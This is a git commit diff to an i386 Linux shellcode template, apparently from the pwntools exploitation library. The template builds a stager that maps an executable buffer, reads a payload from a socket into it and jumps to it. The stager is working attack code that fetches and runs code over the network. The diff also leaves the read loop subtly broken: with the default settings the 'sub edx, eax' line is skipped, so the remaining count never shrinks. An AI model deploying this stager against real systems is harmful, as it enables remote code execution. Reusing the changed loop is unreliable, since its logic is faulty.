501c40163f533917cfca4acb39b1f1f97c381184
Jonas Rudloff <jonas.t.rudloff@gmail.com>
2015-01-05 15:49:06 +0100

    use i386.linux.syscall in stager shellcode

--- pwnlib/shellcraft/templates/i386/linux/stager.asm
+++ pwnlib/shellcraft/templates/i386/linux/stager.asm
@@ -1,6 +1,7 @@
 <% from pwnlib.shellcraft import common %>
 <% from pwnlib.shellcraft import i386 %>
 <% from pwnlib.shellcraft.i386 import linux %>
+<% from pwnlib.constants import SYS_mmap2, SYS_read, PROT_EXEC, PROT_WRITE, PROT_READ, MAP_ANON, MAP_PRIVATE %>
 <%docstring>
 Recives a fixed sized payload into a mmaped buffer
 Useful in conjuncion with findpeer.
@@ -8,45 +9,28 @@ Args:
     sock, the socket to read the payload from.
     size, the size of the payload
 </%docstring>
-<%page args="sock, size"/>
-
+<%page args="sock, size, handle_error=False"/>
 <%
     stager = common.label("stager")
-    mmap = common.label("mmap")
-    looplabel = common.label("loop")
+    looplabel = common.label("read_loop")
     errlabel = common.label("error")
 %>
-
 ${stager}:
-/* old_mmap(NULL, size, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1) */
     push ${sock}
-    xor eax, eax
-    mov al, SYS_mmap
-    xor ebx, ebx
-    ${i386.mov("ecx", size)}
-    push ecx
-    xor edx, edx
-    mov dl, PROT_EXEC|PROT_WRITE|PROT_READ
-    push MAP_ANON|MAP_PRIVATE
-    pop esi
-    xor edi, edi
-    dec edi
-    int 0x80
-    push eax
-
-    pop ecx /* addr of mmaped buffer */
-    pop edx /* size */
+    ${i386.linux.syscall(SYS_mmap2, 0, size, PROT_EXEC+PROT_WRITE+PROT_READ,  MAP_ANON+MAP_PRIVATE, 0xffffffff, 0)}
+    mov ecx, eax
     pop ebx /* sock */
     push ecx /* save for: pop eax; call eax later */
+    ${i386.mov("edx", size)}
 
 /* read/recv loop */
 ${looplabel}:
-    xor eax, eax
-    mov al, SYS_read
-    int 0x80
+    ${i386.linux.syscall(SYS_read, 'ebx', 'ecx', 'edx')}
     test eax, eax
+% if handle_error:
     js ${errlabel}
     sub edx, eax
+% endif
     add ecx, eax
     test edx, edx
     jne ${looplabel}
@@ -55,5 +39,7 @@ ${looplabel}:
     push ebx /* sock */
     call eax /* jump and hope for it to work */
 
+% if handle_error:
 ${errlabel}:
     hlt
+% endif
